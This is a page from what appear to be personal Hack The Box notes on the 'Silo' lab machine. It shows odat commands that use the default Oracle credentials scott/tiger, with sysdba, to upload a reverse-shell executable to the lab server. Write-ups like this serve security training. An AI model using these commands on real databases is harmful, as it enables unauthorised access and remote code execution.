@@ -1,0 +1,31 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>utlfile</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--silo.html">silo</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool.html">Oracle Database Attack Tool</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--SID_Guesser.html">SID Guesser</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--oracle_default_account_wordlist.html">oracle default account wordlist</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_passwordguesser.html">odat passwordguesser</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload.html">odat upload</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--odat_utlfile_-h.html">odat utlfile -h</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--msfvenom.html">msfvenom</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_upload--utlfile.html">utlfile</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--Oracle_Database_Attack_Tool--odat_externaltable.html">odat externaltable</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--silo--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--silo--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>utlfile</u></b></h1><span style="color:#24ff00;">Next, upload the file using the </span><span style="color:#ffa500;">utlfile</span><span style="color:#24ff00;"> module to put our </span><span style="color:#ffa500;">shell.exe</span><span style="color:#ffff00;"> reverseshell payload </span><span style="color:#24ff00;">onto the server.</span><br /><br /><span style="color:#ffa500;">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --putFile /temp shell.exe /root/Documents/htb/boxes/silo/shell.exe</span><br /><br /><span style="color:#24ff00;">We get the following error.<br /></span><img src="images/696-1.png" alt="images/696-1.png" /><br /><br />We <span style="color:#ff0000;">don’t have sufficient privileges</span><span style="color:#24ff00;"> to upload a file. Let’s see if the user was given </span><span style="color:#ffff00;">sysdba</span><span style="color:#24ff00;"> privileges by adding the </span><span style="color:#ffa500;">--sysdba</span><span style="color:#24ff00;"> flag to our command.</span><br /><br /><span style="color:#ffa500;">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --putFile /temp shell.exe /root/Documents/htb/boxes/silo/shell.exe --sysdba</span><br /><img src="images/696-2.png" alt="images/696-2.png" /><span style="color:#24ff00;"><br />our upload was successful and stored onto the /temp directory on the 10.10.10.82 server according to odat's output, however, the /temp directory is not reachable on our webserver and dirbuster would take a while busting where the /temp directory<br /><br />luckily, odat has a module that allows us to execute our .exe payload within its commandline called externaltable</span><br /><br /></div></div>
+</body></html>
